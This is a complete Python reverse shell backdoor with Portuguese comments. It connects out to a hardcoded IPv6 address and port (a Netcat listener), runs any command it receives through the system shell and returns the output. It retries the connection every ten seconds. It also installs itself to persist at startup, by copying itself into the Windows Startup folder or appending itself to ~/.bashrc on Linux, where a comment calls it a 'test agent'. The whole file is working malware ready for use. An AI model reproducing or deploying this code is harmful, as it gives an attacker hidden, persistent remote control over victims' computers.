import socket  # Corrigido para inicial minúscula
import subprocess
import time
import os
import sys
import platform

# Configuração atualizada para a rede privada Tailscale em IPv6
ccip = "fd7a:115c:a1e0::8e01:1aae"  # Seu IPv6 do Tailscale
ccport = 8080                       # Porta configurada no Netcat

def conn(ccip, ccport):
    try:
        # Alterado para AF_INET6 para garantir compatibilidade com IPv6
        client = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        client.connect((ccip, ccport))
        return client
    except Exception:
        return None

def autorun():
    """
    Executa rotinas de persistência baseadas no sistema operacional detectado.
    """
    sistema = platform.system().lower()
    arquivo_atual = os.path.abspath(sys.argv[0])
    nome_arquivo = os.path.basename(arquivo_atual)
    
    if "windows" in sistema:
        try:
            appdata = os.environ.get("APPDATA")
            if appdata:
                pasta_startup = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                caminho_destino = os.path.join(pasta_startup, nome_arquivo)
                
                if not os.path.exists(caminho_destino):
                    comando = f'copy "{arquivo_atual}" "{caminho_destino}"'
                    os.system(f'cmd.exe /c {comando}')
        except Exception:
            pass
            
    elif "linux" in sistema:
        try:
            home = os.environ.get("HOME")
            if home:
                bashrc_path = os.path.join(home, ".bashrc")
                linha_comando = f"python3 {arquivo_atual} &\n"
                
                ja_existe = False
                if os.path.exists(bashrc_path):
                    with open(bashrc_path, "r") as f:
                        if arquivo_atual in f.read():
                            ja_existe = True
                
                if not ja_existe:
                    with open(bashrc_path, "a") as f:
                        f.write(f"\n# Inicializacao automatica do agente de testes\n{linha_comando}")
        except Exception:
            pass

def cmd(data):
    """
    Executa o comando no sistema e retorna os dados formatados.
    """
    try:
        sistema = platform.system().lower()
        
        if "windows" in sistema:
            shell_exec = None  
            encoding_padrao = "cp850"
            prompt = "\nCMD> "
        else:
            shell_exec = "/bin/sh" if os.path.exists("/bin/sh") else "/system/bin/sh"
            encoding_padrao = "utf-8"
            prompt = "\nshell$ "

        proc = subprocess.Popen(
            data, 
            shell=True, 
            executable=shell_exec,
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = proc.communicate()
        output = stdout + stderr
        
        if not output:
            output = "\n"
            
        return output.encode(encoding_padrao, errors='replace') + prompt.encode(encoding_padrao)
        
    except Exception as error:
        return f"Erro ao executar: {str(error)}\n".encode()

def cli(client):
    try:
        sistema = platform.system().lower()
        prompt_inicial = "\nCMD> " if "windows" in sistema else "\nshell$ "
        
        msg_boas_vindas = f"Conexao Estabelecida! Sistema: {platform.system()} {platform.release()}{prompt_inicial}"
        client.send(msg_boas_vindas.encode('utf-8', errors='ignore'))
        
        while True:
            # Captura os dados brutos recebidos
            dados_brutos = client.recv(4096)
            if not dados_brutos:
                # Se o socket fechar de verdade, encerra o loop
                break
                
            data = dados_brutos.decode('utf-8', errors='ignore').strip()
            
            # Se o usuário apenas apertar "Enter", envia o prompt de volta sem quebrar a conexão
            if len(data) == 0:
                client.send(prompt_inicial.encode())
                continue
                
            if data.lower() == ":kill":
                client.send(b"Desconectando...\n")
                break
            
            # Executa de forma sequencial para evitar atropelamento de dados no socket
            resposta = cmd(data)
            client.send(resposta)
            
    except Exception:
        pass
    finally:
        try:
            client.close()
        except:
            pass

if __name__ == "__main__":
    autorun()
    
    while True:
        client = conn(ccip, ccport)
        if client:
            cli(client)
        else:
            # Aguarda 10 segundos antes de tentar reconectar caso o ouvinte caia
            time.sleep(10)
    
